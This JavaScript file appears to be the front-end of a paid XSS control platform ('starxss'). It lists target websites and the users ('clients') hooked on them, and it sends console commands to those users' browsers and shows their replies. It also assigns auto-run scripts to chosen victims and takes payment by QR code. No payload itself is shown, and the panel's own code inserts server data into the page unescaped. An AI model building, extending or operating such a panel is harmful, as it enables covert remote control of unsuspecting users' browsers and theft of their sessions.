var nowDevice = "";     //当前操作的网站
var nowClient = "";     //当前操作的用户


let selectedPaymentMethod = null; // 用于存储选中的支付方式
let selectedAmount = null; // 用于存储选中的金额


//操作
function getDevices() {
    nowDevice = "";
    var data;
    $.ajax({
        url: '/getDevices/',
        type: 'POST',
        beforeSend: function () {
            const container = $('.devices-container');
            container.html(`
                <div class="outer-div">
                    <div class="inner-div">
                        <img src="./static/icons/load.png" alt="加载中...">
                        <span>加载中....</span>
                    </div>
                </div>
            `);
        },
        success: function (response) {
            data = response; // 打印服务器响应
            const container = $('.devices-container');
            container.html('');
            data.forEach(item => {
                const itemDiv = $('<div class="item-box"></div>');
                itemDiv.html(`
                    <div class="device-header">
                        <span class="device-name"><h3><strong>${item.title}</strong></h3></span>
                        <div class="device-circle" onclick="selectDemo(this)" data-url="${item.url}"></div>
                    </div>
                    <div class="action-panel hidden">
                        <button onclick="getClients(this)" data-url="${item.url}">详细</button>
                    </div>
                    <a href="https://${item.url}"><div class="detail-box">${item.url}</div></a>
                `);
                container.append(itemDiv);
            });
        }
    });
}

function getClients(element) {
    loadContent('clients');
    if (element) nowDevice = $(element).data("url");

    const sendData = {device: nowDevice};
    var data;
    $.ajax({
        url: '/getClients/',
        type: 'POST',
        contentType: 'application/json',
        data: JSON.stringify(sendData),
        beforeSend: function () {
            const container = $('.devices-container');
            container.html(`
                <div class="outer-div">
                    <div class="inner-div">
                        <img src="static/icons/load.png" alt="加载中...">
                        <span>加载中....</span>
                    </div>
                </div>
            `);
        },
        success: function (response) {
            data = response; // 打印服务器响应
            const container = $('.devices-container');
            container.html('');
            data.forEach(item => {
                const itemDiv = $('<div class="item-box"></div>');
                itemDiv.html(`
                    <div class="device-header">
                        <span class="device-name"><h3><strong>${item.name}</strong></h3></span>
                        <div class="device-circle" onclick="selectDemo(this)" data-url="${item.name}"></div>
                    </div>
                    <div class="action-panel hidden" data-url="${item.name}">
                        <button onclick="openEditor(this)">控制台</button>
                    </div>
                    <div class="detail-box">${item.detail}</div>
                `);
                container.append(itemDiv);
            });
        }
    });

    $.ajax({
        url: '/getClients/',
        type: 'POST',
        contentType: 'application/json',
        data: JSON.stringify(sendData),
        beforeSend: function () {
            const container = $('.devices-container');
            container.html(`
                <div class="outer-div">
                    <div class="inner-div">
                        <img src="static/icons/load.png" alt="加载中...">
                        <span>加载中....</span>
                    </div>
                </div>
            `);
        },
        success: function (response) {
            data = response; // 打印服务器响应
            const container = $('.devices-container');
            container.html('');
            data.forEach(item => {
                const itemDiv = $('<div class="item-box"></div>');
                itemDiv.html(`
                    <div class="device-header">
                        <span class="device-name"><h3><strong>${item.name}</strong></h3></span>
                        <div class="device-circle" onclick="selectDemo(this)" data-url="${item.name}"></div>
                    </div>
                    <div class="action-panel hidden" data-url="${item.name}">
                        <button onclick="openEditor(this)">控制台</button>
                    </div>
                    <div class="detail-box">${item.detail}</div>
                `);
                container.append(itemDiv);
            });
        }
    });
}


function selectDemo(circle) {
    var isSelected = $(circle).hasClass('selected');
    var panel = $(circle).parent().next(".action-panel");

    if (isSelected) {
        panel.addClass('hidden');
        $(circle).removeClass('selected');
    } else {
        panel.removeClass('hidden');
        $(circle).addClass('selected');
    }
}

function selectScript(circle) {
    var isSelected = $(circle).hasClass('sSelected');
    var panel = $(circle).parent().next(".action-panel");

    if (isSelected) {
        panel.addClass('hidden');
        $(circle).removeClass('sSelected');
    } else {
        panel.removeClass('hidden');
        $(circle).addClass('sSelected');
    }
}

function addDevice() {
    var targetUrl = $("#target-url").val();
    $.ajax({
        url: '/addDevices/',
        type: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({ url: targetUrl }),
        success: function(response) {
            var status = response.status;
            console.log(status);
            if (status === "failed") {
                alert(targetUrl + "已存在");
            }
            getDevices();
        }
    });
    closeModal();
}


function deleteDevice() {
    var sendData = [];
    var selects = $(".selected");
    selects.each(function() {
        var url = $(this).data("url");
        console.log($(this));
        sendData.push({ url: url });
    });
    console.log(sendData);
    $.ajax({
        url: '/deleteDevices/',
        type: 'POST',
        contentType: 'application/json',
        data: JSON.stringify(sendData),
        success: function(response) {
            console.log('success');
            getDevices();
        }
    });
    closeModal();
}

function deleteClient() {
    var sendData = [];
    var selects = $(".selected");
    selects.each(function() {
        var name = $(this).data("name");
        console.log($(this));
        sendData.push({ url: nowDevice + '/' + name });
    });
    $.ajax({
        url: '/deleteClients/',
        type: 'POST',
        contentType: 'application/json',
        data: JSON.stringify(sendData),
        success: function(response) {
            console.log('success');
            getClients();
        }
    });
    closeModal();
}



//脚本
function getScripts() {
    var container = $('.scripts-container');
    container.html(`
        <div class="outer-div">
            <div class="inner-div">
                <img src="./static/icons/load.png" alt="加载中...">
                <span>加载中....</span>
            </div>
        </div>
    `);

    $.ajax({
        url: '/getScripts/',
        type: 'POST',
        success: function (data) {
            container.empty();
            data.forEach(item => {
                var itemDiv = $('<div class="item-box"></div>');
                itemDiv.html(`
                    <div class="device-header">
                        <span class="device-name"><h3><strong>${item.name}</strong></h3></span>
                        <div class="device-circle" onclick="loadContent('devices')""><img src="/static/icons/goto.png" alt="去使用"></div>
                    </div>
                    <a href="https://starxss.starbot.top/view.php?id=${item.id}" id="script-detail">
                        <div class="detail-box">版本：${item.version}</div>
                        <div class="detail-box">${item.detail}</div>
                    </a>
                `);
                container.append(itemDiv);
            });
        },
        error: function (jqXHR, textStatus, errorThrown) {
            console.error('Error: ' + textStatus, errorThrown);
        }
    });
}


function openEditor(client) {
    if (client) {
        c = $(client).parent().attr("data-url");
        nowClient = c;
        openModal('console-modal');
    }


    var sendData = {
        device: nowDevice + '/',
        client: nowClient,
        command: $("#editor").val()
    };


    $.ajax({
        url: '/updateConsole/',
        type: 'POST',
        contentType: "application/json",
        data: JSON.stringify(sendData),
        success: function (commands) {
            var output = "";
            commands.forEach(command => {
                output += `<div class='out-command'>${command["command"]}</div><div class='out-reply'>${command["reply"]}</div><hr>`;
            });
            $('#output').html(output);
            $('#console-modal').scrollTop($('#console-modal').prop("scrollHeight"), 200);
            $('#editor').val("");
        },
        error: function (jqXHR, textStatus, errorThrown) {
            console.error('Error: ' + textStatus, errorThrown);
        }
    });
}

function selectScripts(con) {
    openModal(con);
    var container = $("#"+con).children("#control-content");
    container.html(`
        <div class="outer-div">
            <div class="inner-div">
                <img src="./static/icons/load.png" alt="加载中...">
                <span>加载中....</span>
            </div>
        </div>
    `);

    $.ajax({
        url: '/getScripts/',
        type: 'POST',
        success: function (data) {
            container.empty();
            data.forEach(item => {
                var itemDiv = $('<div class="item-box"></div>');
                itemDiv.html(`
                    <div class="device-header">
                        <span class="device-name"><h3><strong>${item.name}</strong></h3></span>
                        <div class="device-circle" onclick="selectScript(this)" data-id="${item.id}" data-v="${item.version}"></div>
                    </div>
                    <div class="detail-box">版本：${item.version}</div>
                    <div class="detail-box">${item.detail}</div>
                    
                `);
                container.append(itemDiv);
            });
        },
        error: function (jqXHR, textStatus, errorThrown) {
            console.error('Error: ' + textStatus, errorThrown);
        }
    });

    var selects = $('.selected');
    var clients = [];

    selects.each(function (index){
        clients.push($(this).attr("data-url"));
    });
    let sendData = {
        device: nowDevice,
        clients: clients,
    }
    $.ajax({
        url: '/getAutoDo/',
        type: 'POST',
        contentType: "application/json",
        data: JSON.stringify(sendData),
        success: function (data) {
            console.log(data);
            data.forEach(item => {
                let id = item["id"];
                let v = item["version"];
                let s = $('.device-circle');
                s.each(function (index){
                    if($(this).attr("data-id")==id&&$(this).attr("data-v")==v){
                        $(this).addClass("sSelected");
                    }
                })
            });
        }
    });
}

function setAutoDo() {
    var selects = $('.selected');
    var sSelects = $('.sSelected');
    var clients = [];
    var scripts = [];

    selects.each(function (index){
        clients.push($(this).attr("data-url"));
    });
    sSelects.each(function (index){
        let id = $(this).attr("data-id");
        let v = $(this).attr("data-v");
        scripts.push({
            id: id,
            version: v
        });
    });

    var sendData = {
        device: nowDevice,
        clients: clients,
        scripts: scripts
    }

    $.ajax({
        url: "/setAutoDo/",
        type: "POST",
        contentType: "application/json",
        data: JSON.stringify(sendData),
        success: function (){
            alert("修改成功");
            closeModals();
        }
    })
}

//支付


function selectPaymentMethod(method) {
    const paymentOptions = document.querySelectorAll('.payment-option');
    paymentOptions.forEach(option => option.classList.remove('selected')); // 移除所有选项的选中状态
    const selectedOption = document.querySelector(`.payment-option[onclick*="${method}"]`); // 根据方法名找到对应的选项
    if (selectedOption) {
        selectedOption.classList.add('selected'); // 添加选中状态
        selectedPaymentMethod = method; // 保存选中的支付方式
    } else {
        selectedPaymentMethod = null; // 如果找不到对应的选项，则重置选中的支付方式
    }
}

function selectAmount(amount) {
    const amountOptions = document.querySelectorAll('.amount-option');
    amountOptions.forEach(option => option.classList.remove('selected')); // 移除所有选项的选中状态
    const selectedOption = document.querySelector(`.amount-option[onclick*="${amount}"]`); // 根据金额找到对应的选项
    if (selectedOption) {
        selectedOption.classList.add('selected'); // 添加选中状态
        selectedAmount = amount; // 保存选中的金额
    } else {
        selectedAmount = null; // 如果找不到对应的选项，则重置选中的金额
    }
}

function sendPaymentRequest() {
    if (!selectedPaymentMethod || !selectedAmount) {
        alert("请选择支付方式并选择金额！");
        return;
    }
    const pay = document.getElementById("qrcode");
    pay.src = "static/icons/"+selectedPaymentMethod+selectedAmount+".jpg";
    openModal('pay-modal');
    console.log("Amount:", selectedAmount, "Payment Method:", selectedPaymentMethod); // 这里可以添加更多的逻辑处理支付请求
}